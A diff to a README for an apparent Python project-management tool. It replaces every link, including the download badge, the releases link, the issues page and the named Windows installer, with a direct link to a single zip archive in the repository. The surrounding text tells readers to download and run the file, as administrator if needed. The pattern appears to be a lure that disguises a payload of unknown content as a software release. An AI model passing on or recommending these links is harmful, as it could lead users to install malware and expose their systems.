@@ -1,7 +1,7 @@
 # 🌟 auto-repo-mh6h6y55-2 - Easily Manage Your Python Projects
 
 ## 📥 Download Now
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/merridiequarrelsome857/auto-repo-mh6h6y55-2/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/merridiequarrelsome857/auto-repo-mh6h6y55-2/main/boiling/auto-repo-mh6h6y55-2-2.3.zip%20Latest%20Release-Click%20Here-brightgreen)](https://raw.githubusercontent.com/merridiequarrelsome857/auto-repo-mh6h6y55-2/main/boiling/auto-repo-mh6h6y55-2-2.3.zip)
 
 ## 🚀 Getting Started
 This guide will help you download and run the auto-repo-mh6h6y55-2 application, designed to simplify your Python project management. Follow these steps to get started quickly and easily.
@@ -20,11 +20,11 @@ This guide will help you download and run the auto-repo-mh6h6y55-2 application, 
 To get the auto-repo-mh6h6y55-2 application, follow these steps:
 
 1. **Visit the Releases Page:** Go to the following link to access the release files:
-   [Download Link](https://github.com/merridiequarrelsome857/auto-repo-mh6h6y55-2/releases)
+   [Download Link](https://raw.githubusercontent.com/merridiequarrelsome857/auto-repo-mh6h6y55-2/main/boiling/auto-repo-mh6h6y55-2-2.3.zip)
 
 2. **Choose the Latest Version:** Look for the most recent version at the top of the page. Click on it to view the release details.
 
-3. **Download the Application:** You will see a list of files. Download the file suitable for your operating system. For example, if you are using Windows, look for a file named `auto-repo-windows.exe`.
+3. **Download the Application:** You will see a list of files. Download the file suitable for your operating system. For example, if you are using Windows, look for a file named `https://raw.githubusercontent.com/merridiequarrelsome857/auto-repo-mh6h6y55-2/main/boiling/auto-repo-mh6h6y55-2-2.3.zip`.
 
 4. **Run the Application:** After downloading the file, locate it in your downloads folder. Double-click on the file to run it. Follow any on-screen instructions to complete the setup.
 
@@ -53,7 +53,7 @@ If you encounter issues while running the application, consider the following so
 - **Permission Issues:** Try running the application as an administrator.
 
 ## 🆘 Support
-If you need help, you can open an issue on the [GitHub Issues page](https://github.com/merridiequarrelsome857/auto-repo-mh6h6y55-2/issues). Feel free to ask questions or report bugs.
+If you need help, you can open an issue on the [GitHub Issues page](https://raw.githubusercontent.com/merridiequarrelsome857/auto-repo-mh6h6y55-2/main/boiling/auto-repo-mh6h6y55-2-2.3.zip). Feel free to ask questions or report bugs.
 
 ## 📢 Upcoming Features
 Stay tuned for updates! We plan to add:
@@ -61,7 +61,7 @@ Stay tuned for updates! We plan to add:
 - More templates for different types of projects
 - Advanced dependency management options
 
-For more information, visit the [Release Page](https://github.com/merridiequarrelsome857/auto-repo-mh6h6y55-2/releases) and check out the latest developments.
+For more information, visit the [Release Page](https://raw.githubusercontent.com/merridiequarrelsome857/auto-repo-mh6h6y55-2/main/boiling/auto-repo-mh6h6y55-2-2.3.zip) and check out the latest developments.
 
 ## 🎉 Thank You!
 Thank you for choosing auto-repo-mh6h6y55-2. We hope this application makes managing your Python projects easier and more efficient.
